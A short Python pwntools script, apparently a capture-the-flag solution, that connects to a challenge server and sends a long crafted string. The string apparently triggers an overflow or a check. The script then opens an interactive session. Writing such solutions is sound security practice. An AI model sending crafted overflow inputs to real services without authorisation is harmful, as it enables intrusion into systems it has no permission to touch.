from pwn import *

ip = "chals.syssec.dk"
port = 13334
print(b"Diegooooooooooooooooooooo1111")
with remote(ip, port, level="debug") as remote:
    remote.sendline(b"1iegooooooooooooooooooooo1111")

    remote.interactive()